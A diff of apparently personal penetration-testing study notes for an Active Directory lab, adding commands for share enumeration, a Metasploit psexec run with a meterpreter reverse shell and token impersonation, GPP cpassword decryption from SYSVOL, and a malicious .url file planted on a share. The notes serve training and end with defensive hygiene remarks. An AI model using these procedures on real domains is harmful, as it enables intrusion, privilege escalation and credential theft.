@@ -124,6 +124,10 @@ net use M: /delete
 
 #Session collection in BloodHound seems to be heavily restricted even for local admin accounts
 
+# Find shares!
+nxc smb <target_ip_or_range> -u <username> -p <password> -d <domain> --shares
+
+
 
 Attacking AD post compromise attacks
 Pass the Hash (PTH)
@@ -178,6 +182,38 @@ sudo ip link set eth1 down && sudo ip link set eth0 up
 sudo ip link set eth1 up # You can turn it on again after one search in firefox that works
 
 Impersonating Tokens
+Tokens
+Delegated vs Impersonation
+Delegated (Created on logon, removed on reboot)
+Impersonation (Non interactive)
+# I swear this is related to SeImpersonate, but tokens are local, or is the act of getting access to a domain account even if only locally dangerous as it allows execution domain wide?
+# LSASS
+# PPL? CredentialGuard?
+msfconsole -q
+use exploit/windows/smb/psexec #In metasploit
+show options
+set LHOST eth1
+set lport 1234
+set rhosts 192.168.1.100
+set  smbdomain marvel.local
+set smbpass Password3
+set smbuser fcastle
+show targets
+set target 2
+set payload windows/x64/meterpreter/reverse_tc
+# Needs AV disabled
+load -l
+load incognito
+help
+list_tokens -u
+impersonate_token "NT AUTHORITY"\\SYSTEM
+impersonate_token "Marvel"\\Administrator
+# These accounts only show after logon, must be delegated tokens
+dir \\HYDRA-DC01\C$ #To prove admin ownership
+
+# PLEASE have admin account hygiene!!!!
+# Account tiering
+# Local Admin restriction 
 
 
 Kerberos fix Kali
@@ -202,12 +238,46 @@ Always check the hash prefix before choosing the mode; the KDC decides etype, no
 https://github.com/trustedsec/orpheus
 hashcat -m 13100 -a 0 spns.txt $ROCKYOU #this worked, evem when using enc 18?
 
+
+GPP Group Policy Preference attacks
+MS14-025
+Legacy vulnerability
+# If cpassword was stored, still there
+# Windows 2008-2012 typically
+# GPP is software for Admins
+# XML File containing cpasswords and secrets encrypted with AES key, Microsoft leaked the key lmao
+smbclient \\\\<dcip>\\Replication
+mget * # get all files
+# gpp-enumerate metasploit?
+# Typically needs user account
+# FIND groups.xml file!!!!
+findstr /S /I cpassword \\domain\SYSVOL\domain\Policies\*.xml
+gpp-decrypt <cpassword>
+# In Active box, use kerberoasting to find admin account and crack it :)
+# Note to self, learn to properly make GPOs and OUs, pretty sure I made many that didn't link or work properly
+# Tried setting up attack, didn't work as password section is greyed out, and windows will not allow it
+
+URL attack
+nxc smb <target_ip_or_range> -u <username> -p <password> -d <domain> --shares
+#  Make file with notepad named "@test.url" and save to share, change actual name to be stealthy and relevant, social engineer
+# FIle must start with @ or ~ so it is at top of directory
+# FInd share where you have write access, I found \\HYDRA-DCO1.MARVEL.local\rivals as a share
+
+#NOTE. attack worked when http service was on (and no relay setup, but probably works with http off and relaying), BUT I needed to manually open the file
+# When opening even with AV off WIndows says file may be harmful
+
+
+# TO DO TEST LATER:
+# It seems it doesn't auto open as it's not trusted, perhaps changing the domain (used blah domain because of TCM) or making it a trusted zone can make attack more dangerous?
+# Note changed blah domain to server1.marvel.local and still failed
+
 ###
 Mini meta notes:
 Learn to troubleshoot and diagnose failing tools
 Learn to use documentation and built in tools to find correct syntax and commands
 Understand what TCM is looking for, and why?
 
+ 
 ###
 #Learn more shares
 
